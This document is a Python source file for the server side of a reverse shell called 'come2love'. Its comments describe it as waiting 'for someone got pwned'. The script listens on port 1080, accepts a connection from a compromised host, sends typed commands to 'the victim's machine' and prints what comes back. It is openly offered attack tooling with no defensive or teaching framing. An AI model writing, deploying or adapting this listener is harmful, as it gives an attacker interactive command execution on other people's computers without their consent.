# server.py - come2love reverse shell server
# use to wait for someone got pwned

"""
BSD 3-Clause License

Copyright (c) 2022, ringwormGO <ringwormgo@gmail.com>
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

3. Neither the name of the copyright holder nor the names of its
   contributors may be used to endorse or promote products derived from
   this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
"""

import socket
import sys

print("come2love reverse shell server")

# Verbosely  - just for debugging

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print("Socket created - socket.AF_INET, socket.SOCK_STREAM")
except Exception:
	print(f"Cannot create socket. Debugging info: {Exception}")

address = "0.0.0.0"
port = 1080

try:
	s.bind((address, port))
	print(f"Bind successful - on {address}:{port}")
except Exception:
	print(f"Bind unsuccessful. Debugging info: {Exception}")

try:
	s.listen(1)
	print("Waiting for connection....")
except:
        print("error while listening.")

welcome_msg = "Connected"

def main():
	conn, r_addr = s.accept()
	print(f"You are connected with {r_addr}")
	conn.sendall(welcome_msg.encode())
	print(conn.recv(2048).decode())
	try:
		while True:
			inp = input("$ ")
			if len(inp) <= 0:
				continue
			else:
				conn.sendall(inp.encode()) # Send command to the victim's machine
				recv_output = conn.recv(16384)
				if recv_output.decode() == "sesclosed":
					print("Received session close. Exiting...")
					sys.exit(0)
				print(recv_output.decode())


	except BrokenPipeError:
		print("Broken pipe")
		print("Session closed - relistening...")
		#s.bind((address, port))
		s.listen(5)
		main()

if __name__ == "__main__":
	main()
